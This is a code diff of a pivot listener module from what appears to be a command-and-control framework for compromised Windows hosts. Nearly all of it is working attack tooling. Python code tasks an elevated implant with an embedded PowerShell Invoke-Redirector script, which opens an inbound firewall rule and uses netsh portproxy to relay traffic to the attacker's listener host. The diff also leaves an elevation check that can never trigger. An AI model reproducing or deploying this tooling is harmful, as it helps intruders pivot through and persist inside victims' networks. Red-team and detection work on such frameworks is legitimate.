@@ -19,7 +19,7 @@ class Listener(object):
     def __init__(self, mainMenu: MainMenu, params=[]):
 
         self.info = {
-            "Name": "redirector",
+            "Name": "port_forward_pivot",
             "Authors": [
                 {
                     "Name": "Chris Ross",
@@ -43,24 +43,24 @@ class Listener(object):
             # format:
             #   value_name : {description, required, default_value}
             "Name": {
-                "Description": "Listener name. This needs to be the name of the agent that will serve as the internal pivot",
+                "Description": "Name for the listener.",
+                "Required": True,
+                "Value": "port_forward_pivot",
+            },
+            "Agent": {
+                "Description": "Agent to run port forwards pivot on.",
                 "Required": True,
                 "Value": "",
             },
             "internalIP": {
-                "Description": "Internal IP address of the agent. Yes, this could be pulled from the db but it becomes tedious when there is multiple addresses.",
-                "Required": True,
+                "Description": "Uses internal IP of the agent by default.",
+                "Required": False,
                 "Value": "",
             },
             "ListenPort": {
                 "Description": "Port for the agent to listen on.",
                 "Required": True,
                 "Value": 80,
-            },
-            "Listener": {
-                "Description": "Name of the listener to clone",
-                "Required": True,
-                "Value": "",
             },
         }
 
@@ -689,177 +689,179 @@ class Listener(object):
         here and the actual server code in another function to facilitate threading
         (i.e. start_server() in the http listener).
         """
-
-        tempOptions = copy.deepcopy(self.options)
-        listenerName = self.options["Listener"]["Value"]
-        with SessionLocal() as db:
-            parent_listener = self.mainMenu.listenersv2.get_by_name(db, listenerName)
-        if parent_listener:
-            self.options = copy.deepcopy(parent_listener.options)
-            self.options["Name"]["Value"] = name
-        else:
-            log.error("Parent listener not found")
-            return False
-
-        # validate that the Listener does exist
-        if self.mainMenu.listeners.is_listener_valid(listenerName):
-            # check if a listener for the agent already exists
-
-            if self.mainMenu.listeners.is_listener_valid(tempOptions["Name"]["Value"]):
-                log.error(
-                    f"{listenerName}: Pivot listener already exists on agent {tempOptions['Name']['Value']}"
+        try:
+            tempOptions = copy.deepcopy(self.options)
+            with SessionLocal.begin() as db:
+                agent = self.mainMenu.agentsv2.get_by_id(
+                    db, self.options["Agent"]["Value"]
                 )
-                return False
+                listenerName = agent.listener
+                tempOptions["internalIP"]["Value"] = agent.internal_ip
 
-            listenerOptions = self.options
-            sessionID = self.mainMenu.agents.get_agent_id_db(
-                tempOptions["Name"]["Value"]
-            )
-            isElevated = self.mainMenu.agents.is_agent_elevated(sessionID)
+                parent_listener = self.mainMenu.listenersv2.get_by_name(
+                    db, listenerName
+                )
 
-            if self.mainMenu.agents.is_agent_present(sessionID) and isElevated:
+                if parent_listener:
+                    self.options = copy.deepcopy(parent_listener.options)
+                    self.options["Name"]["Value"] = name
+                else:
+                    log.error("Parent listener not found")
+                    return False
 
-                if self.mainMenu.agents.get_language_db(sessionID).startswith(
-                    "po"
-                ) or self.mainMenu.agents.get_language_db(sessionID).startswith("csh"):
-                    # logic for powershell agents
-                    script = """
-        function Invoke-Redirector {
-            param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
-            if($ShowAll){
-                $out = netsh interface portproxy show all
-                if($out){
-                    $out
-                }
-                else{
-                    "[*] no redirectors currently configured"
-                }
-            }
-            elseif($Reset){
-                Netsh.exe advfirewall firewall del rule name="$FirewallName"
-                $out = netsh interface portproxy reset
-                if($out){
-                    $out
-                }
-                else{
-                    "[+] successfully removed all redirectors"
-                }
-            }
-            else{
-                if((-not $ListenPort)){
-                    "[!] netsh error: required option not specified"
-                }
-                else{
-                    $ConnectAddress = ""
-                    $ConnectPort = ""
+                # validate that the Listener does exist
+                if self.mainMenu.listeners.is_listener_valid(listenerName):
+                    # check if a listener for the agent already exists
 
-                    $parts = $ConnectHost -split(":")
-                    if($parts.Length -eq 2){
-                        # if the form is http[s]://HOST or HOST:PORT
-                        if($parts[0].StartsWith("http")){
-                            $ConnectAddress = $parts[1] -replace "//",""
-                            if($parts[0] -eq "https"){
-                                $ConnectPort = "443"
-                            }
-                            else{
-                                $ConnectPort = "80"
-                            }
-                        }
-                        else{
-                            $ConnectAddress = $parts[0]
-                            $ConnectPort = $parts[1]
-                        }
-                    }
-                    elseif($parts.Length -eq 3){
-                        # if the form is http[s]://HOST:PORT
-                        $ConnectAddress = $parts[1] -replace "//",""
-                        $ConnectPort = $parts[2]
-                    }
-                    if($ConnectPort -ne ""){
-                        Netsh.exe advfirewall firewall add rule name=`"$FirewallName`" dir=in action=allow protocol=TCP localport=$ListenPort enable=yes
-                        $out = netsh interface portproxy add v4tov4 listenaddress=$ListenAddress listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
+                    if self.mainMenu.listeners.is_listener_valid(
+                        tempOptions["Name"]["Value"]
+                    ):
+                        log.error(
+                            f"{listenerName}: Pivot listener already exists on agent {tempOptions['Name']['Value']}"
+                        )
+                        return False
+
+                    session_id = agent.session_id
+                    self.options["Agent"] = tempOptions["Agent"]
+                    if agent and agent.high_integrity:
+                        isElevated = agent.high_integrity
+                        if not isElevated:
+                            log.error("Agent must be elevated to run a redirector")
+                        if agent.language.lower() in ["powershell", "csharp"]:
+                            # logic for powershell agents
+                            script = """
+                function Invoke-Redirector {
+                    param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
+                    if($ShowAll){
+                        $out = netsh interface portproxy show all
                         if($out){
                             $out
                         }
                         else{
-                            "[+] successfully added redirector on port $ListenPort to $ConnectHost"
+                            "[*] no redirectors currently configured"
+                        }
+                    }
+                    elseif($Reset){
+                        Netsh.exe advfirewall firewall del rule name="$FirewallName"
+                        $out = netsh interface portproxy reset
+                        if($out){
+                            $out
+                        }
+                        else{
+                            "[+] successfully removed all redirectors"
                         }
                     }
                     else{
-                        "[!] netsh error: host not in http[s]://HOST:[PORT] format"
+                        if((-not $ListenPort)){
+                            "[!] netsh error: required option not specified"
+                        }
+                        else{
+                            $ConnectAddress = ""
+                            $ConnectPort = ""
+        
+                            $parts = $ConnectHost -split(":")
+                            if($parts.Length -eq 2){
+                                # if the form is http[s]://HOST or HOST:PORT
+                                if($parts[0].StartsWith("http")){
+                                    $ConnectAddress = $parts[1] -replace "//",""
+                                    if($parts[0] -eq "https"){
+                                        $ConnectPort = "443"
+                                    }
+                                    else{
+                                        $ConnectPort = "80"
+                                    }
+                                }
+                                else{
+                                    $ConnectAddress = $parts[0]
+                                    $ConnectPort = $parts[1]
+                                }
+                            }
+                            elseif($parts.Length -eq 3){
+                                # if the form is http[s]://HOST:PORT
+                                $ConnectAddress = $parts[1] -replace "//",""
+                                $ConnectPort = $parts[2]
+                            }
+                            if($ConnectPort -ne ""){
+                                Netsh.exe advfirewall firewall add rule name=`"$FirewallName`" dir=in action=allow protocol=TCP localport=$ListenPort enable=yes
+                                $out = netsh interface portproxy add v4tov4 listenaddress=$ListenAddress listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
+                                if($out){
+                                    $out
+                                }
+                                else{
+                                    "[+] successfully added redirector on port $ListenPort to $ConnectHost"
+                                }
+                            }
+                            else{
+                                "[!] netsh error: host not in http[s]://HOST:[PORT] format"
+                            }
+                        }
                     }
                 }
-            }
-        }
-        Invoke-Redirector"""
+                Invoke-Redirector"""
 
-                    script += " -ConnectHost %s" % (listenerOptions["Host"]["Value"])
-                    script += " -ConnectPort %s" % (listenerOptions["Port"]["Value"])
-                    script += " -ListenAddress %s" % (
-                        tempOptions["internalIP"]["Value"]
-                    )
-                    script += " -ListenPort %s" % (tempOptions["ListenPort"]["Value"])
-                    script += " -FirewallName %s" % (sessionID)
+                            script += " -ConnectHost %s" % (
+                                self.options["Host"]["Value"]
+                            )
+                            script += " -ConnectPort %s" % (
+                                self.options["Port"]["Value"]
+                            )
+                            script += " -ListenAddress %s" % (
+                                tempOptions["internalIP"]["Value"]
+                            )
+                            script += " -ListenPort %s" % (
+                                tempOptions["ListenPort"]["Value"]
+                            )
+                            script += " -FirewallName %s" % (session_id)
 
-                    # clone the existing listener options
-                    self.options = copy.deepcopy(listenerOptions)
+                            for option, values in self.options.items():
+                                if option.lower() == "host":
+                                    if self.options[option]["Value"].startswith(
+                                        "https://"
+                                    ):
+                                        host = "https://%s:%s" % (
+                                            tempOptions["internalIP"]["Value"],
+                                            tempOptions["ListenPort"]["Value"],
+                                        )
+                                        self.options[option]["Value"] = host
+                                    else:
+                                        host = "http://%s:%s" % (
+                                            tempOptions["internalIP"]["Value"],
+                                            tempOptions["ListenPort"]["Value"],
+                                        )
+                                        self.options[option]["Value"] = host
 
-                    for option, values in self.options.items():
+                            # check to see if there was a host value at all
+                            if "Host" not in list(self.options.keys()):
+                                self.options["Host"]["Value"] = host
 
-                        if option.lower() == "name":
-                            self.options[option]["Value"] = sessionID
+                            self.mainMenu.agenttasksv2.create_task_shell(
+                                db, agent, script
+                            )
 
-                        elif option.lower() == "host":
-                            if self.options[option]["Value"].startswith("https://"):
-                                host = "https://%s:%s" % (
-                                    tempOptions["internalIP"]["Value"],
-                                    tempOptions["ListenPort"]["Value"],
-                                )
-                                self.options[option]["Value"] = host
-                            else:
-                                host = "http://%s:%s" % (
-                                    tempOptions["internalIP"]["Value"],
-                                    tempOptions["ListenPort"]["Value"],
-                                )
-                                self.options[option]["Value"] = host
+                            msg = "Tasked agent to install Pivot listener "
+                            self.mainMenu.agents.save_agent_log(
+                                tempOptions["Agent"]["Value"], msg
+                            )
 
-                    # check to see if there was a host value at all
-                    if "Host" not in list(self.options.keys()):
-                        self.options["Host"]["Value"] = host
+                            return True
 
-                    with SessionLocal.begin() as db:
-                        agent = self.mainMenu.agentsv2.get_by_id(
-                            db, tempOptions["Name"]["Value"]
-                        )
-                        self.mainMenu.agenttasksv2.create_task_shell(db, agent, script)
+                        elif agent.language.lower() == "python":
 
-                    msg = "Tasked agent to install Pivot listener "
-                    self.mainMenu.agents.save_agent_log(
-                        tempOptions["Name"]["Value"], msg
-                    )
+                            # not implemented
+                            script = """
+                            """
 
-                    return True
+                            log.error("Python pivot listener not implemented")
+                            return False
 
-                elif self.mainMenu.agents.get_language_db(
-                    self.options["Name"]["Value"]
-                ).startswith("py"):
-
-                    # not implemented
-                    script = """
-                    """
-
-                    log.error("Python pivot listener not implemented")
-                    return False
-
-                else:
-                    log.error("Unable to determine the language for the agent")
-
-            else:
-                if not isElevated:
-                    log.error("Agent must be elevated to run a redirector")
-                else:
-                    log.error("Agent is not present in the cache")
-                return False
+                        else:
+                            log.error("Unable to determine the language for the agent")
+                    else:
+                        log.error("Agent is not present in the cache")
+                        return False
+        except:
+            log.error(f'Listener "{name}" failed to start')
+            return False
 
     def shutdown(self, name=""):
         """
